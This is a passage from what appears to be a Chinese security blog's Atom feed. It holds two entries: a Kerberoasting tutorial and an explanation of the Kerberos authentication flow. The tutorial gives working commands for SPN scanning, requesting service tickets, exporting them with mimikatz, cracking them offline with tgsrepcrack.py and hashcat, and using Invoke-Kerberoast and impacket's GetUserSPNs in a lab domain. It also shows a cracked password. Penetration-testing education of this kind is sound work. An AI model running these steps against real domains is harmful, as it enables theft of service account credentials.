src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1550808563_5c6f75f3bd0ee.png" alt="img"></p><p>更直观的说可以把 LDAP 协议理解为一个关系型数据库，其中存储了域内主机的各种配置信息。</p><p>在域控中默认安装了 ADSI 编辑器，全称 ActiveDirectory Service Interfaces Editor (ADSI Edit)，是一种 LDAP 的编辑器，可以通过在域控中运行 adsiedit.msc 来打开（服务器上都有，但是只有域控中的有整个域内的配置信息）。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566312270376.png" alt="1566312270376"></p><p>通过 adsiedit.msc 我们可以修改和编辑 LADP，在 SPN 查询时实际上就是查询 LADP 中存储的内容。</p><p>比如在我们是实验环境域 0day.org中，存在名为运维组 的一个 OU（OrganizationUnit，可以理解为一个部门，如行政、财务等等），其中包含了 sqlsvr 这个用户，从用户属性中可以看到 sqlsvr 注册过的 SPN 内容。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566312646927.png" alt="1566312646927"></p><p>在一台主机执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T 0day.org -q */*</span><br></pre></td></tr></table></figure><p>命令查询域内 SPN 时，通过抓包可以看到正是通过 LDAP 协议向域控中安装的 LDAP 服务查询了 SPN 的内容。</p><p>如图在主机192.168.3.62上执行目录，在域控192.168.3.142可以看到LDAP协议的流量。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566315225924.png" alt="1566315225924"></p><p>流量中的查询结果：</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566315297166.png" alt="1566315297166"></p><p>Powershell 脚本其实主要就是通过查询 LDAP 的内容并对返回结果做一个过滤，然后展示出来。</p><h3><span id="kerberoasting">Kerberoasting</span></h3><p>介绍 Kerberos 的认证流程时说到，在 KRB_TGS_REP 中，TGS 会返回给 Client 一张票据 ST，而 ST 是由 Client 请求的 Server 端密码进行加密的。当 Kerberos 协议设置票据为 RC4 方式加密时，我们就可以通过爆破在 Client 端获取的票据 ST，从而获得 Server 端的密码。</p><p>下图为设置 Kerberos 的加密方式，在域中可以在域控的「本地安全策略」中进行设置：</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566351683199.png" alt="1566351683199"></p><p>设置RC4 方式加密。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566351735173.png" alt="1566351735173"></p><p>设置完成之后运行里输入「gpupdate」刷新组策略，策略生效。</p><h4><span id="kerberoasting攻击方式一">Kerberoasting攻击方式一</span></h4><p>一、在域内主机 PC-Jack 中通过 Kerberoast 中的 GetUserSPNs.vbs  进行 SPN 扫描。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript GetUserSPNs.vbs</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566365425645.png" alt="1566365425645"></p><p>二、根据扫描出的结果使用微软提供的类 KerberosRequestorSecurityToken 发起 kerberos 请求，申请 ST 票据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Add-Type -AssemblyName System.IdentityModel  </span><br><span class="line">PS C:\&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/Srv-Web-Kit.rootkit.org&quot;</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566365452567.png" alt="1566365452567"></p><p>三、Kerberos 协议中请求的票据会保存在内存中，可以通过 klist 命令查看当前会话存储的 kerberos 票据。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566365516959.png" alt="1566365516959"></p><p>使用 mimikatz 导出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list /export</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566365758402.png" alt="1566365758402"></p><p>使用 kerberoast 工具集中的 tgsrepcrack.py 工具进行离线爆破，成功得到jerry账号的密码admin!@#45</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 tgsrepcrack.py wordlist.txt &quot;1-40a10000-jerry@MSSQLSvc~Srv-Web-Kit.rootkit.org-ROOTKIT.ORG.kirbi&quot;</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566366235728.png" alt="1566366235728"></p><h4><span id="kerberoasting攻击方式二">Kerberoasting攻击方式二</span></h4><p>Kerberoasting攻击方式一中需要通过 mimikatz 从内存中导出票据，Invoke-Kerberoast 通过提取票据传输时的原始字节，转换成 John the Ripper 或者 HashCat 能够直接爆破的字符串。</p><p>使用 Invoke-Kerberoast 脚本 (这里使用的是 Empire 中的 Invoke-Kerberoast.ps1)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-module Invoke-Kerberoast.ps1</span><br><span class="line">Invoke-kerberoast -outputformat hashcat |fl</span><br></pre></td></tr></table></figure><p>–outputformat 参数可以指定输出的格式，可选 John the Ripper 和 Hashcat 两种格式</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566368713159.png" alt="1566368713159"></p><p>二、使用 HASHCAT 工具进行破解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PSC:&gt; hashcat64.exe –m 13100 test1.txt password.list --force</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566369553181.png" alt="1566369553181"></p><h3><span id="impacket-进行kerberoasting">Impacket 进行Kerberoasting</span></h3><p>这里要用到<strong>impacket</strong>工具包，该工具包用于对SMB1-3或IPv4 / IPv6 上的TCP、UDP、ICMP、IGMP，ARP，IPv4，IPv6，SMB，MSRPC，NTLM，Kerberos，WMI，LDAP等协议进行低级编程访问。这里我们使用的是GetUserSPNs工具，可使用该工具对目标主机进行SPN探测。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/SecureAuthCorp/impacket               官方仓库https://github.com/maaaaz/impacket-examples-windows      有人已将各个脚本打包成相应的exe,此处绝大部分也都将全部用这些exe单文件来进行操作</span><br></pre></td></tr></table></figure><p>其命令用法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GetUserSPNs.py -request -dc-ip x.x.x.x 域名称/域用户</span><br></pre></td></tr></table></figure><p>输入当前域用户的密码，即可的到票据。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566370994765.png" alt="1566370994765"></p><p>同样对票据进行爆破。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe –m 13100 test1.txt password.list --force</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566371165660.png" alt="1566371165660"></p><h3><span id="reference">Reference</span></h3><p><a href="https://www.freebuf.com/articles/system/196434.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/196434.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;spn-简介&quot;&gt;SPN 简介&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;服务主体名称（SPN：ServicePrincipal Names）是服务实例（可以理解为一个服务，比如 HTTP、MSSQL）的唯一标识符。Kerberos 身份验证使用 SPN 将服务实例与
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>域渗透-Kerberos</title>
    <link href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberos.html"/>
    <id>https://uknowsec.cn/posts/notes/域渗透-Kerberos.html</id>
    <published>2019-08-20T14:17:17.000Z</published>
    <updated>2019-08-24T14:55:28.140Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="kerberos简介">Kerberos简介</span></h3><p>在Kerberos认证中，最主要的问题是如何证明“你是你”的问题，如当一个Client去访问Server服务器上的某服务时，Server如何判断Client是否有权限来访问自己主机上的服务，同时保证在这个过程中的通讯内容即使被拦截或篡改也不影响通讯的安全性，这正是Kerberos解决的问题。在域渗透过程中Kerberos协议的攻防也是很重要的存在。</p><h4><span id="kerberos协议框架"><strong>Kerberos协议框架</strong></span></h4><p>在Kerberos协议中主要是有三个角色的存在：</p><ul><li><p>访问服务的Client</p></li><li><p>提供服务的Server</p></li><li><p>KDC（Key Distribution Center）密钥分发中心</p><p>其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。</p></li></ul><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1550808223_5c6f749fcab92.png" alt="img"></p><p>如果把Kerberos中的票据类比为一张火车票，那么Client端就是乘客，Server端就是火车，而KDC就是就是车站的认证系统。如果Client端的票据是合法的（由你本人身份证购买并由你本人持有）同时有访问Server端服务的权限（车票对应车次正确）那么你才能上车。当然和火车票不一样的是Kerberos中有存在两张票，而火车票从头到尾只有一张。</p><p>由上图中可以看到KDC又分为两个部分：</p><p><strong>Authentication Server</strong>： AS的作用就是验证Client端的身份（确定你是身份证上的本人），验证通过就会给一张TGT（Ticket Granting Ticket）票给Client。</p><p><strong>Ticket Granting Server</strong>： TGS的作用是通过AS发送给Client的票（TGT）换取访问Server端的票（上车的票ST）。ST（ServiceTicket）也有资料称为TGS Ticket，为了和TGS区分，在这里就用ST来说明。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1550808240_5c6f74b00650e.png" alt="img"></p><p>KDC服务框架中包含一个KRBTGT账户，它是在创建域时系统自动创建的一个账号，可以暂时理解为他就是一个无法登陆的账号。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566292231162.png" alt="1566292231162"></p><h4><span id="kerberos认证">Kerberos认证</span></h4><p>流程当Client想要访问Server上的某个服务时，需要先向AS证明自己的身份，然后通过AS发放的TGT向Server发起认证请求，这个过程分为三块：</p><p><strong>The Authentication Service Exchange</strong>：Client与AS的交互</p><p><strong>The Ticket-Granting Service (TGS) Exchange</strong>：Client与TGS的交互</p><p><strong>The Client/Server Authentication Exchange</strong>：Client与Server的交互</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1550808351_5c6f751f0e65d.png" alt="img"></p><p><strong>(1)TheAuthentication Service Exchange</strong></p><p>KRB_AS_REQ</p><p>Client-&gt;AS：发送 Authenticator1(Client 密码加密 TimeStamp)</p><p>第一步 Client 先向 KDC 的 AS 发送 Authenticator1，内容为通过 Client 密码 Hash 加密的时间戳、ClientID、网络地址、加密类型等内容。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1550808364_5c6f752ca1489.png" alt="AAA"></p><p>KRB_AS_REP</p><p>AS-&gt; Client：发送 Client 密码加密的 sessionkey-as 和票据 TGT(KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp)</p><p>在 KDC 中存储了域中所有用户的密码 HASH，当 AS 接收到 Client 的请求之后会根据 KDC 中存储的密码来解密，解密成功并且验证信息。验证成功后返回给 Client 由 Client 密码 HASH 加密的 sessionkey-as 和 TGT（由 KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp 等信息）。</p><p><strong>(2)TheTicket-Granting Service (TGS) Exchange</strong></p><p>KRB_TGS_REQ</p><p>Client -&gt;TGS 发送 Authenticator2 (sessionkey-as 加密 TimeStamp) 和票据 TGT(KRBTGT HASH 加密的 sessionkey-as 和 TimeStamp)</p><p>Client 接收到了加密后的 Sessionkey-as 和 TGT 之后，用自身密码解密得到 Sessionkey-as，TGT 是由 KDC 密码加密，Client 无法解密。这时 Client 再用 Sessionkey-as 加密 TimeStamp 和 TGT 一起发送给 KDC 中的 TGS（TicketGranting Server）票据授权服务器换取能够访问 Server 的票据。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1550808381_5c6f753dc78d7.png" alt="IMG"></p><p>KRB_TGS_REP</p><p>TGS-&gt; Client 发送 密文 1(sessionkey-as 加密 sessionkey-tgs) 和 票据 ST(Server 密码 HASH 加密 sessionkey-tgs)</p><p>TGS 收到 Client 发送过来的 TGT 和 Sessionkey-as 加密的 TimeStamp 之后，首先会检查自身是否存在 Client 所请求的服务。如果服务存在，则用 KRBTGT 密码解密 TGT。一般情况下 TGS 会检查 TGT 中的时间戳查看 TGT 是否过期，且原始地址是否和 TGT 中保存的地址相同。验证成功之后将用 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 Sessionkey-tgs 发送给 Client。</p><p><strong>(3)TheClient/Server Authentication Exchange</strong></p><p>KRB_AP_REQ</p><p>Client -&gt;Server 发送 Authenticator3(sessionkey-tgs 加密 TimeStamp) 和票据 ST(Server 密码 HASH 加密 sessionkey-tgs)</p><p>Client 收到 sessionkey-as 加密的 sessionkey-tgs 和 Server 密码 HASH 加密的 sessionkey-tgs 之后用 sessionkey-as 解密得到 sessionkey-tgs，然后把 sessionkey-tgs 加密的 TimeStamp 和 ST 一起发送给 Server。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1550808396_5c6f754c56c54.png" alt="IMG"></p><p>KRB_AP_REP</p><p>Server-&gt; Client</p><p>server 通过自己的密码解密 ST，得到 sessionkey-tgs, 再用 sessionkey-tgs 解密 Authenticator3 得到 TimeStamp，验证正确返回验证成功。</p><h3><span id="reference">Reference</span></h3><p><a href="https://www.freebuf.com/articles/system/196434.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/196434.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;kerberos简介&quot;&gt;Kerberos简介&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;在Kerberos认证中，最主要的问题是如何证明“你是你”的问题，如当一个Client去访问Server服务器上的某服务时，Server如何判断Client是否有权限来访问自己主
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
</feed>
